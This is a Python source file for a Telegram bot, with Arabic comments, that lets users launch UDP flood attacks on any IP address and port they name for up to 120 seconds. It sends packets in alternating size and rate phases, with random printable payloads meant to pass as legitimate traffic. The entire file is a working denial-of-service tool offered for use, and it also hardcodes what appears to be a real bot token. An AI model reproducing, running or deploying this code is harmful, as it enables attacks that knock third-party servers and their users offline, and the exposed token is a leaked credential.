
import asyncio
import random
import socket
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# إعدادات البوت
TOKEN = "6197840010:AAHYojr7jBnRT61bIPXVHiGBQmTiz2SRZNw"
MAX_DURATION = 120  # الحد الأقصى للهجوم (ثانية)

class ThrottleAttackBot:
    def __init__(self):
        self.active_attacks = {}
        self.attack_phases = [
            {'size': 1400, 'interval': 0.02, 'duration': 4},  # مرحلة ضغط عالي
            {'size': 600, 'interval': 0.15, 'duration': 6},   # مرحلة تباطؤ
            {'size': 3000, 'interval': 0.05, 'duration': 3}   # مرحلة متوسطة
        ]

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """رسالة الترحيب"""
        await update.message.reply_text(
            "👋 مرحبا! لإرسال هجوم تذبذب:\n"
            "<code>IP PORT DURATION</code>\n\n"
            "مثال: <code>192.168.1.100 80 30</code>\n"
            "الحد الأقصى: 120 ثانية\n"
            "استخدم /stop لإيقاف الهجوم",
            parse_mode='HTML'
        )

    async def stop_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """إيقاف الهجوم الحالي"""
        user_id = update.effective_user.id
        if user_id in self.active_attacks:
            self.active_attacks[user_id]['running'] = False
            await update.message.reply_text("✅ تم إيقاف الهجوم")
        else:
            await update.message.reply_text("⚠️ لا يوجد هجوم نشط")

    async def handle_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """معالجة أمر الهجوم"""
        user_id = update.effective_user.id
        
        if user_id in self.active_attacks:
            await update.message.reply_text("⚠️ يوجد هجوم نشط بالفعل")
            return
            
        try:
            args = update.message.text.split()
            if len(args) != 3:
                return
                
            ip, port, duration = args[0], int(args[1]), int(args[2])
            
            if not 1 <= duration <= MAX_DURATION:
                await update.message.reply_text(f"⚠️ المدة بين 1 و{MAX_DURATION} ثانية")
                return
                
            self.active_attacks[user_id] = {'running': True}
            asyncio.create_task(
                self.run_throttle_attack(update, ip, port, duration, user_id)
            )
            
            await update.message.reply_text(
                f"🌀 بدء هجوم التذبذب على {ip}:{port}\n"
                f"⏱ المدة: {duration} ثانية"
            )
            
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {str(e)}")

    async def run_throttle_attack(self, update: Update, ip: str, port: int, duration: int, user_id: int):
        """تنفيذ هجوم التذبذب"""
        start_time = time.time()
        end_time = start_time + duration
        
        try:
            while time.time() < end_time and self.active_attacks.get(user_id, {}).get('running', False):
                for phase in self.attack_phases:
                    if not self.active_attacks.get(user_id, {}).get('running', False):
                        break
                        
                    phase_end = time.time() + phase['duration']
                    while time.time() < phase_end and self.active_attacks.get(user_id, {}).get('running', False):
                        self.send_packet(ip, port, phase['size'])
                        await asyncio.sleep(phase['interval'])
            
            await update.message.reply_text(f"✅ اكتمل الهجوم على {ip}:{port}")
            
        except Exception as e:
            await update.message.reply_text(f"❌ خطأ: {str(e)}")
        finally:
            if user_id in self.active_attacks:
                del self.active_attacks[user_id]

    def send_packet(self, ip: str, port: int, size: int):
        """إرسال حزمة UDP ذكية"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('0.0.0.0', random.randint(1024, 5000)))
            
            # بيانات تبدو كطلبات شرعية (نطاق ASCII للطباعة)
            payload = bytes([random.randint(32, 126) for _ in range(size)])
            
            sock.sendto(payload, (ip, port))
            sock.close()
        except:
            pass

def main():
    """تشغيل البوت"""
    bot = ThrottleAttackBot()
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", bot.start))
    app.add_handler(CommandHandler("stop", bot.stop_attack))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_attack))
    
    app.run_polling()

if __name__ == "__main__":
    main()
